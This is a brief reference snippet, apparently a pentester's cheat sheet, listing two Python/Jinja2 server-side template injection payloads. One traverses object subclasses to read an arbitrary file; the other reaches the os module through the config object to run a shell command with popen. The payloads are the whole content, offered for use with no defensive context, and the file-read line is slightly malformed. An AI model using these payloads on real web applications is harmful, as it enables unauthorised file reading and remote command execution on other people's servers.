#SSTI #python

## Read a file
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/my/file).read()}}	
```

## Import os module, and run a command (popen).
```
{{config.__class__.__init__.__globals__['os'].popen(myCommand).read()}}
```

